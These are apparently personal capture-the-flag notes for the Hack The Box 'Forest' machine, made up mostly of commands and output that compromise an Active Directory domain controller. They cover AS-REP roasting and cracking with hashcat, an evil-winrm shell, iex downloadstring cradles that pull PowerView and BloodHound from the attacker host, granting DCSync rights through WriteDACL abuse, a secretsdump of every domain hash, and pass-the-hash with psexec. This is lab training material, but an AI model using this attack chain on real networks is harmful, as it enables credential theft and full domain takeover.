```
10.10.10.161	forest.htb
```
nmap
```
nmap -Pn -v -p 88,5985,443,80,1433,53,445,25,143,110,993,3389,995,139,587,135 -sCV -oN scans/nmap-tcpscans_10.10.10.161.txt 10.10.10.161
```
```
Nmap scan report for forest.htb (10.10.10.161)
Host is up (0.18s latency).

PORT     STATE  SERVICE       VERSION
53/tcp   open   domain        Simple DNS Plus
88/tcp   open   kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-28 04:56:18Z)
135/tcp  open   msrpc         Microsoft Windows RPC
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
5985/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m46s, deviation: 4h37m08s, median: 6m45s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-12-27T20:37:01-08:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-12-28T04:37:03
|_  start_date: 2021-12-28T04:30:54
```
signing enabled and required -> cannot pass NTLM hash against smb
```
enum4linux -a 10.10.10.161 | tee enumout.txt
```
```
 =========================================== 
|    Getting domain SID for 10.10.10.161    |
 =========================================== 
Domain Name: HTB
Domain Sid: S-1-5-21-3072663084-364016917-1341370565
[+] Host is part of a domain (not a workgroup)

 ============================= 
|    Users on 10.10.10.161    |
 ============================= 
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA  Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy  Name: Andy Hislip       Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1  Name: HealthMailbox-EXCH01-010  Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e  Name: HealthMailbox-EXCH01-003  Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678  Name: HealthMailbox-EXCH01-005  Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e  Name: HealthMailbox-EXCH01-009  Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781  Name: HealthMailbox-EXCH01-006  Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d  Name: HealthMailbox-EXCH01-004  Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64  Name: HealthMailbox-EXCH01-008  Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9  Name: HealthMailbox-EXCH01-002  Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722  Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013  Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad  Name: HealthMailbox-EXCH01-001  Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238  Name: HealthMailbox-EXCH01-007  Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda       Name: Lucinda Berger    Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron   Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb  Name: Microsoft Exchange Migration      Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}       Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb  Name: Microsoft Exchange Approval Assistant     Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18  Name: Discovery Search Mailbox  Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a  Name: Microsoft Exchange        Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb  Name: E4E Encryption Store - Active     Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b  Name: Microsoft Exchange        Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b  Name: Microsoft Exchange        Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco  Name: svc-alfresco      Desc: (null)
```
```
user:[Administrator] rid:[0x1f4]
user:[krbtgt] rid:[0x1f6]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
```
 ============================== 
|    Groups on 10.10.10.161    |
 ============================== 

[+] Getting builtin groups:
group:[Account Operators] rid:[0x224]
group:[Administrators] rid:[0x220]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[IIS_IUSRS] rid:[0x238]
group:[Remote Management Users] rid:[0x244]
group:[Server Operators] rid:[0x225]
```
```
[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```
```
user:[Administrator] rid:[0x1f4]
user:[krbtgt] rid:[0x1f6]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
```
cat users.txt| cut -d"[" -f2 | cut -d"]" -f1
```
```
Administrator
krbtgt
sebastien
lucinda
svc-alfresco
andy
mark
santi
```
crack usernames/usernames -> failed
```
crackmapexec smb 10.10.10.161 -u users.txt -p users.txt
```
try usernames on kerberos -> find kerberoastable users (AS-REP attack)
```
for user in $(cat users.txt);do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user};done
```
```
[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:44bfe2374ef97fd6245324c137c2da46$3de1c200c007fda4fab03d01a782c720eef2676a12e18ca7a1433bdae93699941d84632afa109ee87244acccaaa296d2a7ae9daf36ef6791a50d5512efb25cd26eebf17b1988aaa111dd1a000c3911ef4d9828b5e68fc0ea94c6d25d23b68db74ed381def4818419dd1901995dceac672b64bd22d951ba5f498bab81baedf92547ef760cad5c788f4380b65cee8235724e5ef4637214efcdd1bb20bc1caf8cbc16006c011e0fa98ce8a3fb5c5af90069d9f9032acd19b52dd2ddaaa11184c3f17f20afa4a6e32b7c4ecc066f104945e12674327ef8c7becfbcb28afc1488c5f8
```
```
save as krb5asrep.svc-alfreso
```
crack with hashcat ([hashcat formats](https://hashcat.net/wiki/doku.php?id=example_hashes))
```
hashcat -m 18200 krb5asrep.svc-alfresco /usr/share/wordlists/rockyou.txt --force
```
```
$krb5asrep$23$svc-alfresco@HTB:44bfe2374ef97fd6245324c137c2da46$3de1c200c007fda4fab03d01a782c720eef2676a12e18ca7a1433bdae93699941d84632afa109ee87244acccaaa296d2a7ae9daf36ef6791a50d5512efb25cd26eebf17b1988aaa111dd1a000c3911ef4d9828b5e68fc0ea94c6d25d23b68db74ed381def4818419dd1901995dceac672b64bd22d951ba5f498bab81baedf92547ef760cad5c788f4380b65cee8235724e5ef4637214efcdd1bb20bc1caf8cbc16006c011e0fa98ce8a3fb5c5af90069d9f9032acd19b52dd2ddaaa11184c3f17f20afa4a6e32b7c4ecc066f104945e12674327ef8c7becfbcb28afc1488c5f8:s3rvice
```
password: s3rvice
now login as svc-alfresco / s3rvice
### initial shell
since port 5985 (windows remote management) is open, login using evil-winrm
```
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```
### privesc
make sure apache is running:
```
sudo service apache2 start
```
check apache logs:
```
sudo tail -f /var/log/apache2/access.log
```
load jaws
```
iex(new-object net.webclient).downloadstring('http://10.10.14.37/jaws.txt')
```
```
download c:\windows\tasks\jawchecks.txt
```
load powerup
```
iex(new-object net.webclient).downloadstring('http://10.10.14.37/up.txt')
```
```
type c:\windows\tasks\upchecks.txt
```
```
ModifiablePath    : C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps
IdentityReference : HTB\svc-alfresco
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
```
### windows ad
start enumerating windows AD
load powerview
```
iex(new-object net.webclient).downloadstring('http://10.10.14.37/view.txt')
```
```
Forest                  : htb.local
DomainControllers       : {FOREST.htb.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : FOREST.htb.local
RidRoleOwner            : FOREST.htb.local
InfrastructureRoleOwner : FOREST.htb.local
Name                    : htb.local

SourceName        : htb.local
TargetName        : htb.local
TargetNetbiosName : HTB
Flags             : IN_FOREST, TREE_ROOT, PRIMARY, NATIVE_MODE
ParentIndex       : 0
TrustType         : UPLEVEL
TrustAttributes   : 0
TargetSid         : S-1-5-21-3072663084-364016917-1341370565
TargetGuid        : dff0c71a-a949-4b26-8c7b-52e3e2cb6eab
```
load bloodhound
```
iex(new-object net.webclient).downloadstring('http://10.10.14.37/hound.txt')
```
```
Invoke-BloodHound -Domain htb.local -CollectionMethod All -OutputDirectory "c:\windows\tasks\"
```
```
download c:\windows\tasks\20211227220509_BloodHound.zip
```
svc-alfresco -> member of htb.local/SERVICE ACCOUNTS
SERVICE ACCOUNTS -> member of PRIVILEGED IT ACCOUNTS
PRIVILEGED IT ACCOUNTS -> member of ACCOUNT OPERATORS
ACCOUNT OPERATORS -> GenericALL on EXCHANGE WINDOWS PERMISSIONS -> WriteDACL on HTB.LOCAL
```
net group "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco /add /domain
```
```
# check
net group "EXCHANGE WINDOWS PERMISSIONS" /domain
```
abuse WriteDACL -> follow bloodhound instructions
```
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $SecPassword)
```
(note: requires powerview to be loaded)
give svc-alfresco DCSync rights
```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync -Verbose
```
(note: ldap syntax)
```
htb.local -> DC=htb,DC=local
deloitte.com -> DC=deloitte,DC=com
```
ok there's a cleanup script removing members from "EXCHANGE WINDOWS PERMISSIONS" every 5 min -> speed is of essence:
```
net group "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco /add /domain
net group "EXCHANGE WINDOWS PERMISSIONS" /domain
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync -Verbose
```
impacket-secretsdump (dcsync from linux on windows AD)
```
impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@forest.htb -dc-ip 10.10.10.161
```
```
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:c6b43239db9d5b1e4a2bea881418fcfd:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
FOREST$:aes256-cts-hmac-sha1-96:1c8fabc796e3d1acefccbce0f5a34ff99947d702d53b46424cfae1bd6c9c009d
FOREST$:aes128-cts-hmac-sha1-96:df60ed9ac1c092e050688759cfb8bb08
FOREST$:des-cbc-md5:1097b940c1890ec4
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
```
login with administrator's hash -> psexec.py
```
impacket-psexec administrator@forest.htb -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```
### post-root: try -Rights All
again with -Rights All (didn't work) -> maybe WriteDACL on htb.local doesn't mean can add members to Domain Admins
```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights All -Verbose
```
```
net group "Domain Admins" svc-alfresco /add /domain
```
```
net group "Domain Admins" /domain
```
```
net group "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco /add /domain
net group "EXCHANGE WINDOWS PERMISSIONS" /domain
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights All -Verbose
net group "Domain Admins" svc-alfresco /add /domain
net group "Domain Admins" /domain
```